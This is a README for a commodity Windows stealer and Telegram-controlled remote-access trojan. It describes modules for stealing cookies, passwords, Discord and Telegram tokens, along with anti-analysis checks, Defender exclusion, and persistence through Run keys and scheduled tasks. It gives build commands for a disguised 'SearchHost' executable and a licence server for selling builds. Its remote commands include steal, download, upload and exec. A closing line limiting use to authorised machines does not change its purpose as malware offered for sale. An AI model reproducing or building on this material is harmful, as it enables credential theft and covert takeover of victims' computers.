# JohnWick implant — Windows stealer + Telegram RAT

Single compiled exe, many victims. One build bakes your bot token + chat id into
`cfg.json`; every machine that runs it beacons to the same destination. Per-victim
identity comes from system info at runtime, not a per-target rebuild.

## Modules

| file | job |
|---|---|
| `jwg_implant.py` | entrypoint: guard → licence → persistence → exfil → C2 loop |
| `jwg_cfg.py` | loads/validates baked `cfg.json`, fails closed |
| `guard.py` | anti-VM / anti-debug verdict, AV enumeration, hosts blocklist, Defender exclusion |
| `stealer.py` | cookies, saved passwords, Discord tokens, Telegram tdata, Roblox cookie |
| `c2.py` | Telegram long-poll command channel + inline-keyboard file browser |
| `shots.py` | GDI full-desktop screenshot (no Pillow required) |
| `persist.py` | HKCU Run key + scheduled task, Task Manager block |
| `licensing.py` | access-key gate for reseller builds (fail-closed) |
| `builder.py` | bake cfg.json + PyInstaller onefile with FUD-leaning flags |
| `admin.py` | manage keys against the licence server |
| `netlify/functions/license.js` | free Netlify licence backend (issue/revoke/validate) |

Reuses `capture.py` (verified Chromium+DPAPI / Firefox readers) and `sysinfo.py`.

## Build (on Windows)

```bat
py -3.11 -m pip install requests requests-toolbelt pycryptodomex pywin32 pyinstaller
py -3.11 builder.py --token <BOT_TOKEN> --chat <CHAT_ID> --name SearchHost
:: -> dist\SearchHost.exe  (+ cfg.json packed beside it)
```

Reseller/licence-gated build:

```bat
py -3.11 builder.py --token <T> --chat <C> --sell JWG-KEY --licence-url https://you.netlify.app/api/license
```

## Run / control (Telegram)

Text: `/info` `/ls` `/cd <path>` `/download <path>` `/upload <url> [dest]`
`/exec <path>` `/screenshot` `/steal` `/reexe` `/uninstall`
Inline keyboard: browse dirs, `..`, `drives`, paging, per-file `dl`/`run`.

## Licence server (Netlify, free tier)

```bash
cd netlify && netlify deploy --build   # or link repo + set ADMIN_TOKEN env
python admin.py --url https://you.netlify.app/api/license issue "cust" 30
```

## Honest limits — read before you call it FUD

- **Chrome/Edge 140+ app-bound v20**: cookie/login values are wrapped by the
  browser process itself; DPAPI is not involved and they are NOT recoverable
  offline. The stealer reports these as `app-bound-v20`, not fake-decrypted.
- **Firefox primary password**: logins stay ciphertext unless the master
  password is blank. Cookies are plaintext and do come out.
- **Telegram tdata**: staged raw; offline decryption needs the device/local key.
- **"FUD" is craft, not a guarantee.** UPX + noconsole + renamed metadata +
  onefile make a smaller, less-obviously-PyInstaller artifact; they do not make
  any binary invisible to every engine. Detection is cat-and-mouse. Real evasion
  here is operational: guard bail in analysis envs, hosts blocklist, optional
  Defender exclusion (needs admin). Test on your own box, expect variance.
- **No Wine/PyInstaller-Windows on this Linux host** — compile on Windows.
- Persistence is HKCU (no admin); it shows in Autoruns. That's the cost of not
  needing elevation.

Run it only against machines you own or are authorised to test.
